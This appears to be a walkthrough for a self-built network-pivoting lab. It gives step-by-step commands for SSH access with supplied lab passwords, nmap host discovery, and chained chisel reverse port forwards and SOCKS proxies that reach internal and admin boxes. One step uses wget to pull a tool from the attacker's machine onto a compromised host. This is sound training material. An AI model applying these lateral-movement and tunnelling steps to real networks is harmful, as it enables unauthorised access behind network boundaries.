# Walkthrough

# Recommendations

Use a multi-plex terminal; tmux, terminator or whatever you find works for you! 

Save the info from the output of the build script. 

# Flags:

1. SSH on box 1.
2. local webserver on box 1
3. ssh onto box 2
4. ssh onto box 3
5. local webserver on box 3

# Flag 1

1. Build the lab
2. Read the readme!

SSH into the box with a password of `danny`

```bash
ssh danny@192.168.69.2
```

read the flag.txt file

# Flag 2

(you are told about local webserver on port 8080)

1. Check to see if server is running.

```bash
netstat -t
Active Internet connections (w/o servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 localhost:8080          localhost:38768         TIME_WAIT  
tcp        0    164 3e2de45ffaca:22         192.168.69.1:33964      ESTABLISHED
```

(told to use a reverse port forward.

1. Upload chisel to the box (Do I assume people know how to do that?)

Start web server on kali:

```bash
python3 -m http.server 9001
Serving HTTP on 0.0.0.0 port 9001 (http://0.0.0.0:9001/) ...
```

Download to the public_box:

```bash
danny@3e2de45ffaca:~$ wget http://172.17.0.1:9001/chisel
```

1. Start chisel server on kali (This will be taught)

```bash
./chisel server --reverse --port 8000
```

1. Connect from public_box

```bash
./chisel client 172.17.0.1:8000 R:127.0.0.1:8081:8080
```

1. get flag

```bash
curl http://127.0.0.1:8081
```

# Flag 3

Complete flag 1

1. Find internal box from public_box

```bash
ip a
eth0@if321: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:0a:0a:10:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.10.16.2/24 brd 10.10.16.255 scope global eth0
       valid_lft forever preferred_lft forever

nmap -sn 10.10.16.0/24
Nmap scan report for internal_box.internal (10.10.16.3)

nmap -p 22 10.10.16.3

Starting Nmap 7.60 ( https://nmap.org ) at 2023-08-11 15:30 UTC
Nmap scan report for internal_box.internal (10.10.16.3)
Host is up (0.00015s latency).

PORT   STATE SERVICE
22/tcp open  ssh
```

1. Upload chisel to box (check above)
2. start chisel server on kali

```bash
./chisel server --reverse --port 8000 --socks5
```

1. Connect from public_box

```bash
danny@3e2de45ffaca:~$ ./chisel client 172.17.0.1:8000 R:1080:socks
```

1. ssh into the machine with the credentials provided before (`ariana:Password1`)

```bash
proxychains ssh ariana@10.10.16.3
```

1. Read the flag.

# Flag 4

1. Complete flag 3
2. find admin box (same way as in flag 3)
3. Upload chisel to internal box (check flag 2)
4. Log into public_box in a second window and start a chisel server

```bash
danny@3e2de45ffaca:~$ ./chisel server --port 8001 --reverse --socks5
```

1. Connect to server from internal box

```bash
ariana@0be609a5a58a:~$ ./chisel client 10.10.16.2:8001 R:1090:socks
```

1. Edit `/etc/proxychains.conf` file to include this line at the end:

```bash
socks5  127.0.0.1 1090
```

1. connect to the admin_box as jack (pwd: `Complexpassword123#`

```bash
proxychains ssh jack@10.10.4.3
```

1. read the flag

# Flag 5 (optional)

It’s not that bad just requires a bit of planning

So we need a tunnel to ssh into the box (as shown for the previous flags) and now we need a tunnel to access the webserver. Considering you are up to flag 5 you should sorta know what you are doing by now.

1. sever on internal box (you can run as a backgrounded command)

```bash
./chisel server --reverse --port 8000 &
```

1. client on admin box

```bash
./chisel client 10.10.4.2:8000 R:127.0.0.1:8081:8080
```

1. server on public box:

```bash
./chisel server --reverse --port 8001 &
```

1. client on internal box:

```bash
./chisel client 10.10.16.2:8001 R:127.0.0.1:8082:8081
```

1. server on kali box:

```bash
./chisel server --reverse --port 8002
```

1. client on public box:

```bash
./chisel client 192.168.69.1:8002 R:127.0.0.1:8083:8082
```

1. Grab the flag

```bash
curl http://127.0.0.1:8083
```

FIN
